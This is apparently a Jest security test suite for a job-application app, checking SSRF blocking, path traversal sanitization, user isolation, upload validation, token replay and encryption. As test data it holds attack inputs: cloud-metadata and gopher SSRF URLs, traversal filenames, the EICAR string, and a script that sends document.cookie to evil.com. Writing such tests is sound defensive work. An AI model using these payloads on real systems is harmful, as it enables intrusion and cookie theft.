/**
 * Security Hardening Test Suite
 * Applier 2.0 — Phase 23: Security Hardening
 *
 * Verifies:
 * 1. SSRF attempts (loopback, private IP ranges, cloud metadata, protocols, port blocking, obfuscated IPs)
 * 2. Path traversal protection & filename sanitization
 * 3. Unauthorized job access & user isolation
 * 4. Cross-user document access protection
 * 5. Malicious upload detection (extensions, magic bytes, EICAR malware test string, script injection)
 * 6. Oversized upload rejection
 * 7. Expired submission confirmation tokens
 * 8. Replay confirmation token attack prevention
 * 9. Document encryption at rest (AES-256-GCM authenticated encryption & tamper detection)
 * 10. Secret isolation & redaction from logs and responses
 */

import { describe, it, expect, beforeEach } from '@jest/globals';
import {
  SSRFGuard,
  SSRFViolationError,
  FileSecurityService,
  FileSecurityError,
  DocumentEncryptionService,
  DocumentEncryptionError,
  SecretIsolationService,
  JobAuthorizationService,
  UnauthorizedAccessError,
  SubmissionTokenGuardService,
  SubmissionTokenError,
  SecurityAuditService,
  BrowserIsolationService
} from '../src/security/index.js';
import { validateSecurityAuditEvent } from '../../shared/validators/index.js';

describe('Applier 2.0 — Phase 23: Security Hardening', () => {

  // ─────────────────────────────────────────────────────────────
  // 1. SSRF PROTECTION & URL VALIDATION
  // ─────────────────────────────────────────────────────────────
  describe('1. SSRF Protection & Private IP Blocking', () => {
    it('blocks loopback IP addresses and localhost', async () => {
      const loopbackUrls = [
        'http://localhost:5000/api/internal',
        'http://127.0.0.1:27017',
        'http://127.0.0.2:8080',
        'http://127.255.255.255/',
        'http://[::1]/admin',
        'http://0.0.0.0:3000'
      ];

      for (const url of loopbackUrls) {
        const result = await SSRFGuard.validateUrl(url, { resolveDns: false });
        expect(result.allowed).toBe(false);
        expect(result.reason).toMatch(/blocked|internal|loopback/i);
      }
    });

    it('blocks private RFC 1918 IPv4 ranges', async () => {
      const privateUrls = [
        'http://10.0.0.1/admin',
        'http://10.255.255.255/setup',
        'http://172.16.0.1/dashboard',
        'http://172.31.255.255/db',
        'http://192.168.1.1/router',
        'http://192.168.0.254/status'
      ];

      for (const url of privateUrls) {
        const result = await SSRFGuard.validateUrl(url, { resolveDns: false });
        expect(result.allowed).toBe(false);
        expect(result.reason).toMatch(/private|blocked range/i);
      }
    });

    it('blocks AWS/GCP/Azure link-local cloud metadata endpoints', async () => {
      const metadataUrls = [
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/metadata/v1.json',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://instance-data/latest/meta-data/'
      ];

      for (const url of metadataUrls) {
        const result = await SSRFGuard.validateUrl(url, { resolveDns: false });
        expect(result.allowed).toBe(false);
        expect(result.reason).toMatch(/blocked|internal|linkLocal/i);
      }
    });

    it('blocks dangerous non-HTTP protocols (file, gopher, ftp, javascript, data)', async () => {
      const nonHttpUrls = [
        'file:///etc/passwd',
        'file:///C:/Windows/win.ini',
        'gopher://127.0.0.1:6379/_flushall',
        'ftp://attacker.org/exfiltrate',
        'javascript:alert(document.cookie)',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
      ];

      for (const url of nonHttpUrls) {
        const result = await SSRFGuard.validateUrl(url, { resolveDns: false });
        expect(result.allowed).toBe(false);
        expect(result.reason).toMatch(/Unsupported protocol|Malformed URL/i);
      }
    });

    it('blocks dangerous database and administrative ports', async () => {
      const dangerousPortUrls = [
        'http://external-company.com:27017/db',
        'http://external-company.com:5432/postgres',
        'http://external-company.com:6379/redis',
        'http://external-company.com:22/ssh',
        'http://external-company.com:2375/docker'
      ];

      for (const url of dangerousPortUrls) {
        const result = await SSRFGuard.validateUrl(url, { resolveDns: false });
        expect(result.allowed).toBe(false);
        expect(result.reason).toMatch(/database port|internal or database/i);
      }
    });

    it('blocks obfuscated decimal and hex IP address formats', async () => {
      const obfuscatedUrls = [
        'http://2130706433/', // Decimal for 127.0.0.1
        'http://0x7f000001/admin', // Hex for 127.0.0.1
        'http://0177.0.0.1/' // Octal for 127.0.0.1
      ];

      for (const url of obfuscatedUrls) {
        const result = await SSRFGuard.validateUrl(url, { resolveDns: false });
        expect(result.allowed).toBe(false);
        expect(result.reason).toMatch(/Obfuscated numeric|hex|loopback|Target IP address/i);
      }
    });

    it('allows valid public external job portal URLs', async () => {
      const publicUrls = [
        'https://careers.google.com/jobs/results/',
        'https://boards.greenhouse.io/stripe/jobs/123456',
        'https://jobs.lever.co/spotify/abcdef-1234',
        'https://apply.workable.com/tech-corp/j/ABC123XYZ/'
      ];

      for (const url of publicUrls) {
        const result = await SSRFGuard.validateUrl(url, { resolveDns: false });
        expect(result.allowed).toBe(true);
        expect(result.sanitizedUrl).toBeDefined();
      }
    });

    it('throws SSRFViolationError when validateUrlOrThrow encounters SSRF', async () => {
      await expect(
        SSRFGuard.validateUrlOrThrow('http://169.254.169.254/latest/meta-data/', { resolveDns: false })
      ).rejects.toThrow(SSRFViolationError);
    });
  });

  // ─────────────────────────────────────────────────────────────
  // 2. PATH TRAVERSAL PROTECTION
  // ─────────────────────────────────────────────────────────────
  describe('2. Path Traversal Protection & Filename Sanitization', () => {
    let fileSecurity;

    beforeEach(() => {
      fileSecurity = new FileSecurityService();
    });

    it('sanitizes ../ and ..\\ directory traversal vectors from uploaded filenames', () => {
      const attackVectors = [
        '../../../etc/passwd.pdf',
        '..\\..\\..\\Windows\\System32\\cmd.exe.png',
        'foo/../../bar/../../secret.txt',
        '....//....//....//config.json.pdf',
        '../../../../var/www/html/shell.php.jpg'
      ];

      for (const vector of attackVectors) {
        const sanitized = fileSecurity.sanitizeFilename(vector);
        expect(sanitized).not.toContain('..');
        expect(sanitized).not.toContain('/');
        expect(sanitized).not.toContain('\\');
      }
    });

    it('strips null bytes (%00, \\0) used in extension bypass attempts', () => {
      const nullByteFilename = 'malicious.php\0.pdf';
      const sanitized = fileSecurity.sanitizeFilename(nullByteFilename);
      expect(sanitized).not.toContain('\0');
      expect(sanitized).toBe('malicious.php.pdf');
    });

    it('creates and securely cleans up sandboxed temporary working directories', () => {
      const sandbox = fileSecurity.createSandboxedTempDir();
      expect(sandbox.dirPath).toBeDefined();
      expect(typeof sandbox.cleanup).toBe('function');
      sandbox.cleanup();
    });
  });

  // ─────────────────────────────────────────────────────────────
  // 3. UNAUTHORIZED JOB ACCESS & USER ISOLATION
  // ─────────────────────────────────────────────────────────────
  describe('3. Unauthorized Job Access & User Isolation', () => {
    const userAlice = { _id: 'usr_alice_111', role: 'APPLICANT' };
    const userBob = { _id: 'usr_bob_222', role: 'APPLICANT' };
    const adminUser = { _id: 'usr_admin_999', role: 'ADMIN' };

    const aliceJob = { _id: 'job_alice_001', userId: 'usr_alice_111', status: 'RUNNING' };

    it('allows job owner to access their own job', () => {
      expect(JobAuthorizationService.authorizeJobAccess(userAlice, aliceJob)).toBe(true);
    });

    it('denies access when a different user attempts unauthorized access to another user job', () => {
      expect(() => {
        JobAuthorizationService.authorizeJobAccess(userBob, aliceJob);
      }).toThrow(UnauthorizedAccessError);

      try {
        JobAuthorizationService.authorizeJobAccess(userBob, aliceJob);
      } catch (err) {
        expect(err.code).toBe('UNAUTHORIZED_JOB_ACCESS');
        expect(err.status).toBe(403);
      }
    });

    it('allows admin users to access jobs for monitoring and recovery', () => {
      expect(JobAuthorizationService.authorizeJobAccess(adminUser, aliceJob)).toBe(true);
    });
  });

  // ─────────────────────────────────────────────────────────────
  // 4. CROSS-USER DOCUMENT ACCESS PROTECTION
  // ─────────────────────────────────────────────────────────────
  describe('4. Cross-User Document Access Protection', () => {
    const userAlice = { _id: 'usr_alice_111', role: 'APPLICANT' };
    const userBob = { _id: 'usr_bob_222', role: 'APPLICANT' };
    const adminUser = { _id: 'usr_admin_999', role: 'ADMIN' };

    const alicePassport = {
      _id: 'doc_passport_alice',
      userId: 'usr_alice_111',
      type: 'PASSPORT',
      fileName: 'passport_alice.pdf'
    };

    it('allows owner to access their own uploaded document', () => {
      expect(JobAuthorizationService.authorizeDocumentAccess(userAlice, alicePassport)).toBe(true);
    });

    it('blocks cross-user document access and throws 403 Forbidden', () => {
      expect(() => {
        JobAuthorizationService.authorizeDocumentAccess(userBob, alicePassport);
      }).toThrow(UnauthorizedAccessError);

      try {
        JobAuthorizationService.authorizeDocumentAccess(userBob, alicePassport);
      } catch (err) {
        expect(err.code).toBe('CROSS_USER_DOCUMENT_ACCESS');
        expect(err.status).toBe(403);
      }
    });

    it('allows admin to access documents for review', () => {
      expect(JobAuthorizationService.authorizeDocumentAccess(adminUser, alicePassport)).toBe(true);
    });
  });

  // ─────────────────────────────────────────────────────────────
  // 5. MALICIOUS UPLOAD & MAGIC BYTES VALIDATION
  // ─────────────────────────────────────────────────────────────
  describe('5. Malicious Upload Detection & Signature Verification', () => {
    let fileSecurity;

    beforeEach(() => {
      fileSecurity = new FileSecurityService();
    });

    it('rejects dangerous executable and script file extensions', async () => {
      const maliciousFiles = [
        'payload.exe', 'exploit.sh', 'backdoor.bat', 'shell.php',
        'script.vbs', 'macro.cmd', 'inject.jsp', 'malware.dll'
      ];

      for (const fname of maliciousFiles) {
        const dummyBuffer = Buffer.from('some content');
        await expect(
          fileSecurity.validateFile({ filename: fname, buffer: dummyBuffer, size: dummyBuffer.length })
        ).rejects.toThrow(FileSecurityError);
      }
    });

    it('detects MIME type spoofing where file claims to be PDF but lacks %PDF- magic bytes', async () => {
      const spoofedPdfBuffer = Buffer.from('MZ\x90\x00\x03\x00\x00\x00This is an executable disguised as PDF');
      await expect(
        fileSecurity.validateFile({ filename: 'resume.pdf', buffer: spoofedPdfBuffer, size: spoofedPdfBuffer.length })
      ).rejects.toThrow(/claims to be PDF but lacks valid %PDF header/);
    });

    it('detects MIME type spoofing where file claims to be PNG but lacks PNG magic bytes', async () => {
      const fakePngBuffer = Buffer.from('NOT_A_PNG_HEADER_TEST');
      await expect(
        fileSecurity.validateFile({ filename: 'photo.png', buffer: fakePngBuffer, size: fakePngBuffer.length })
      ).rejects.toThrow(/claims to be PNG but lacks valid PNG magic bytes/);
    });

    it('detects EICAR standard antivirus test signature and triggers MALWARE_DETECTED', async () => {
      const eicarBuffer = Buffer.from(
        '%PDF-1.4\nX5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\n%%EOF'
      );

      await expect(
        fileSecurity.validateFile({ filename: 'infected_resume.pdf', buffer: eicarBuffer, size: eicarBuffer.length })
      ).rejects.toThrow(/Malicious payload signature detected \(EICAR/);
    });

    it('detects executable script injection disguised in text files', async () => {
      const scriptText = Buffer.from('Candidate note: <script>fetch("http://evil.com/steal?"+document.cookie)</script>');
      await expect(
        fileSecurity.validateFile({ filename: 'notes.txt', buffer: scriptText, size: scriptText.length })
      ).rejects.toThrow(/Disallowed active executable HTML script tag detected/);
    });

    it('passes clean, genuine PDF files with valid %PDF- magic header', async () => {
      const validPdfBuffer = Buffer.from('%PDF-1.5\n%Valid applicant resume payload\n%%EOF');
      const result = await fileSecurity.validateFile({
        filename: 'resume_clean.pdf',
        buffer: validPdfBuffer,
        size: validPdfBuffer.length
      });
      expect(result.valid).toBe(true);
      expect(result.sanitizedFilename).toBe('resume_clean.pdf');
    });
  });

  // ─────────────────────────────────────────────────────────────
  // 6. OVERSIZED UPLOAD REJECTION
  // ─────────────────────────────────────────────────────────────
  describe('6. Oversized Upload Limits', () => {
    it('rejects files exceeding maximum file size', async () => {
      const fileSecurity = new FileSecurityService({ maxFileSize: 2 * 1024 * 1024 }); // 2MB limit

      const smallBuffer = Buffer.from('%PDF-1.4 Valid Small File');
      const validRes = await fileSecurity.validateFile({
        filename: 'small.pdf',
        buffer: smallBuffer,
        size: smallBuffer.length
      });
      expect(validRes.valid).toBe(true);

      // Oversized buffer (3MB)
      const oversizedSize = 3 * 1024 * 1024;
      await expect(
        fileSecurity.validateFile({
          filename: 'huge_document.pdf',
          buffer: smallBuffer,
          size: oversizedSize
        })
      ).rejects.toThrow(/exceeds maximum allowed limit/);
    });
  });

  // ─────────────────────────────────────────────────────────────
  // 7. EXPIRED SUBMISSION CONFIRMATION TOKENS
  // ─────────────────────────────────────────────────────────────
  describe('7. Expired Confirmation Tokens', () => {
    let tokenGuard;

    beforeEach(() => {
      tokenGuard = new SubmissionTokenGuardService();
    });

    it('rejects confirmation token when current time exceeds expiration TTL', () => {
      // Generate token that expired 1 second ago (-1000ms TTL)
      const expiredTokenRecord = tokenGuard.generateToken({
        applicationId: 'app_expired_001',
        userId: 'usr_test_101',
        fieldState: { firstName: 'Alice', lastName: 'Smith' },
        expiresInMs: -1000
      });

      expect(() => {
        tokenGuard.verifyAndConsumeToken({
          token: expiredTokenRecord.token,
          currentFieldState: { firstName: 'Alice', lastName: 'Smith' },
          applicationId: 'app_expired_001',
          userId: 'usr_test_101'
        });
      }).toThrow(SubmissionTokenError);

      try {
        tokenGuard.verifyAndConsumeToken({
          token: expiredTokenRecord.token,
          currentFieldState: { firstName: 'Alice', lastName: 'Smith' },
          applicationId: 'app_expired_001',
          userId: 'usr_test_101'
        });
      } catch (err) {
        expect(err.code).toBe('TOKEN_EXPIRED');
      }
    });
  });

  // ─────────────────────────────────────────────────────────────
  // 8. REPLAY CONFIRMATION TOKEN ATTACK PREVENTION
  // ─────────────────────────────────────────────────────────────
  describe('8. Replay Confirmation Token Attack Prevention', () => {
    let tokenGuard;

    beforeEach(() => {
      tokenGuard = new SubmissionTokenGuardService();
    });

    it('successfully consumes token on first attempt and blocks replay attacks on second attempt', () => {
      const fieldState = { firstName: 'John', email: 'john@example.com' };
      const tokenRecord = tokenGuard.generateToken({
        applicationId: 'app_replay_001',
        userId: 'usr_john_202',
        fieldState,
        expiresInMs: 60000
      });

      // 1. First consumption: must succeed
      const firstConsumption = tokenGuard.verifyAndConsumeToken({
        token: tokenRecord.token,
        currentFieldState: fieldState,
        applicationId: 'app_replay_001',
        userId: 'usr_john_202'
      });
      expect(firstConsumption.valid).toBe(true);
      expect(firstConsumption.consumed).toBe(true);

      // 2. Second consumption (Replay Attack): must fail with TOKEN_REPLAY_DETECTED
      expect(() => {
        tokenGuard.verifyAndConsumeToken({
          token: tokenRecord.token,
          currentFieldState: fieldState,
          applicationId: 'app_replay_001',
          userId: 'usr_john_202'
        });
      }).toThrow(SubmissionTokenError);

      try {
        tokenGuard.verifyAndConsumeToken({
          token: tokenRecord.token,
          currentFieldState: fieldState,
          applicationId: 'app_replay_001',
          userId: 'usr_john_202'
        });
      } catch (err) {
        expect(err.code).toBe('TOKEN_REPLAY_DETECTED');
      }
    });

    it('invalidates confirmation token if form fields are mutated after token was issued', () => {
      const originalFieldState = { firstName: 'John', email: 'john@example.com' };
      const tokenRecord = tokenGuard.generateToken({
        applicationId: 'app_mutation_001',
        userId: 'usr_john_202',
        fieldState: originalFieldState,
        expiresInMs: 60000
      });

      // Attacker mutates salary or declaration after review confirmation
      const mutatedFieldState = { firstName: 'John', email: 'john@example.com', salaryExpectation: '9999999' };

      try {
        tokenGuard.verifyAndConsumeToken({
          token: tokenRecord.token,
          currentFieldState: mutatedFieldState,
          applicationId: 'app_mutation_001',
          userId: 'usr_john_202'
        });
        throw new Error('Should have rejected mutated form');
      } catch (err) {
        expect(err.name).toBe('SubmissionTokenError');
        expect(err.code).toBe('FORM_MUTATED_AFTER_CONFIRMATION');
      }
    });
  });

  // ─────────────────────────────────────────────────────────────
  // 9. DOCUMENT ENCRYPTION AT REST (AES-256-GCM)
  // ─────────────────────────────────────────────────────────────
  describe('9. Document Encryption (AES-256-GCM)', () => {
    let encService;

    beforeEach(() => {
      encService = new DocumentEncryptionService();
    });

    it('encrypts and decrypts documents with tamper detection', () => {
      const plaintext = Buffer.from('CONFIDENTIAL_APPLICANT_PASSPORT_DATA_NUM_A1234567');
      const encrypted = encService.encryptBuffer(plaintext);

      expect(encrypted.packaged).toBeDefined();
      expect(encrypted.iv).toHaveLength(24); // 12 bytes hex
      expect(encrypted.authTag).toHaveLength(32); // 16 bytes hex

      // Decrypt packaged buffer
      const decrypted = encService.decryptBuffer(encrypted.packaged);
      expect(decrypted.toString()).toBe(plaintext.toString());
    });

    it('throws DocumentEncryptionError when encrypted payload has been tampered with', () => {
      const plaintext = Buffer.from('IMMUTABLE_LEGAL_DECLARATION');
      const encrypted = encService.encryptBuffer(plaintext);

      // Corrupt a single byte in ciphertext
      const corrupted = Buffer.from(encrypted.packaged);
      corrupted[corrupted.length - 1] ^= 0xFF;

      expect(() => {
        encService.decryptBuffer(corrupted);
      }).toThrow(DocumentEncryptionError);
    });
  });

  // ─────────────────────────────────────────────────────────────
  // 10. SECRET ISOLATION & REDACTION
  // ─────────────────────────────────────────────────────────────
  describe('10. Secret Isolation & Redaction', () => {
    it('redacts database URIs, API keys, and sensitive fields from objects', () => {
      const rawPayload = {
        applicationId: 'app_test_123',
        status: 'READY',
        databaseConfig: {
          mongoUri: 'mongodb://app_admin:superSecretPassword123@cluster0.mongodb.net/prod',
          redisUrl: 'redis://:authPassword999@10.0.0.1:6379'
        },
        credentials: {
          hfToken: 'hf_abcdef1234567890abcdef1234567890',
          jwtSecret: 'top_secret_jwt_key_2026'
        },
        publicSummary: 'Application for Senior Engineer'
      };

      const sanitized = SecretIsolationService.sanitizeObject(rawPayload);

      expect(sanitized.applicationId).toBe('app_test_123');
      expect(sanitized.publicSummary).toBe('Application for Senior Engineer');
      expect(sanitized.databaseConfig.mongoUri).toBe('[REDACTED]');
      expect(sanitized.databaseConfig.redisUrl).toBe('[REDACTED]');
      expect(sanitized.credentials.hfToken).toBe('[REDACTED]');
      expect(sanitized.credentials.jwtSecret).toBe('[REDACTED]');
    });

    it('masks embedded connection strings in strings', () => {
      const strWithDb = 'Connected to mongodb://root:my_secret_pass@db.example.com:27017/applier successfully';
      const sanitized = SecretIsolationService.sanitizeString(strWithDb);
      expect(sanitized).not.toContain('my_secret_pass');
      expect(sanitized).toContain('[REDACTED_PASS]');
    });
  });

  // ─────────────────────────────────────────────────────────────
  // 11. SECURITY AUDIT LOGGING (CANONICAL SCHEMA VALIDATION)
  // ─────────────────────────────────────────────────────────────
  describe('11. Canonical Security Audit Logging', () => {
    let auditService;

    beforeEach(() => {
      auditService = new SecurityAuditService();
    });

    it('logs canonical security audit events adhering to schema', () => {
      const event = auditService.logSSRFBlocked({
        url: 'http://169.254.169.254/latest/meta-data/',
        reason: 'Blocked cloud metadata IP',
        userId: 'usr_attacker_99',
        ipAddress: '198.51.100.44'
      });

      expect(event.schemaVersion).toBe('2.0.0');
      expect(event.eventType).toBe('SSRF_BLOCKED');
      expect(event.severity).toBe('CRITICAL');
      expect(event.blocked).toBe(true);

      const validation = validateSecurityAuditEvent(event);
      expect(validation.valid).toBe(true);
    });

    it('logs and validates token replay security events', () => {
      const event = auditService.logTokenReplay({
        tokenId: 'conf_replay_attack_token',
        userId: 'usr_attacker_99',
        ipAddress: '203.0.113.195'
      });

      expect(event.eventType).toBe('TOKEN_REPLAY_ATTEMPT');
      expect(event.severity).toBe('CRITICAL');

      const validation = validateSecurityAuditEvent(event);
      expect(validation.valid).toBe(true);
    });
  });

  // ─────────────────────────────────────────────────────────────
  // 12. BROWSER ISOLATION SERVICE
  // ─────────────────────────────────────────────────────────────
  describe('12. Browser Isolation Service', () => {
    let browserIsolation;

    beforeEach(() => {
      browserIsolation = new BrowserIsolationService();
    });

    it('enforces secure context options by blocking geolocation, notifications, camera, microphone', () => {
      const options = browserIsolation.getContextSecurityOptions();
      expect(options.bypassCSP).toBe(false);
      expect(options.ignoreHTTPSErrors).toBe(false);
      expect(options.permissions).toEqual([]);
    });

    it('assertSafeNavigation blocks SSRF navigations', async () => {
      await expect(
        browserIsolation.assertSafeNavigation('http://localhost:5000/api/internal')
      ).rejects.toThrow(SSRFViolationError);
    });
  });
});
